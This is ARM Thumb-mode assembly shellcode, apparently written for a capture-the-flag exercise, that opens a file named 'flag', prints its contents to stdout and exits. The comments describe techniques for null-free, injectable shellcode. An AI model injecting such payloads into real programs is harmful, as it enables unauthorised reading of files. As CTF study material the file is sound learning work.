    .global   _start
    .text
    _start:
    .code 32
	     sub sp, sp, #255 @declare 255 byte buffer for input string
  	     
	     @Thumb-Mode on
    	     add     r6, pc, #1
    	     bx  r6
    .code 16
	     mov r11, sp @frame pointer in r11 to access local variables later (buffer) 
	
	     @@get pointer to filename string
	     mov r0, #48 @ 40 - r0 points to the file name
	     add r0, pc

	     @place a null terminator right behind "flag"
	     mov r2, #48
	     add r2, pc @points now on the byte after "flag" which is Z
	     eor r1, r1 @xor to get null byte
	     strb r1,[r2] @make sure that memory is writeable (thus this shellcode needs to be placed in writetable memory )
	     @mov r8, r8 @nop test
	
	     @@ open file
             mov r1, #2              @2 specifies the file RW
	     mov r7, #5 		@ open syscall              
	     svc 1          	  @open the file ... r0 will contain the file descriptor
	     mov r4, r0 		@save fd

	     @@ read file
	     @fd still in r0 and as first arg for read syscall
   	     
	     mov r1, r11 @ pointer on declared buffer
	     mov r2, #255 @count of to read bytes
   	     mov r7, #3			 @ read syscall and returns count of read bytes in r0
    	     svc 1
	     mov r5, r0 		@save count

	     @@ write to stdout	
	     mov r0, #1                @ file descriptor 1 is stdout
	
	     mov r1, r11 		@ copy pointer to buffer into r1
	     mov r2, r5                @ restore char count from r5 to r2	
  	     mov r7, #4      		 @ write	
	     svc 1                    
         
	     @@ close file
             mov  r0, r4 		 @restore fd from r4 in r0
             mov r7, #6
             svc 1 			@close
             
	     mov sp, r11 		@ deallocate local variables (buffer)

	     @@ exit program            
	     mov r7, #1 		 @ exit 
             svc 1 

	     mov r6, #1 @ NOP - for alignment (needed for pc relative adressing)


	     .ascii "flagZZZ" @this string will be overwritten to "flag\0ZZ" the other two Z are just for alignment   
